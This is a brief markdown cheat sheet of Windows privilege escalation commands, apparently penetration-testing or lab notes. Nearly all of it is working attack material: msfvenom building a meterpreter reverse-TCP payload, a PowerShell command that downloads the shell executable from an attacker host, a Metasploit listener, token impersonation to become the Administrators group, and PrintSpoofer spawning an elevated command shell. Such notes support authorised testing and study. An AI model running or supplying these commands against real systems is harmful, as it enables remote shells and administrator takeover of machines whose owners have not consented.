# Windows privilege escalation methods

## Display current user privileges
```bash
whoami /priv
```

## Upgrade shell to meterpreter
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] --platform windows -f exe > shell.exe

powershell -c "Invoke-WebRequest -Uri 'http://[ip]:[port]/shell.exe' -OutFile 'shell.exe'"

msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
```

## SeDebugPrivilege / SeImpersonatePrivilege
In meterpreter:
```bash
load incognito
list_tokens -g
impersonate_token "BUILTIN\Administrators"
```

## SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege
```bash
PrintSpoofer64.exe -i -c cmd.exe
```
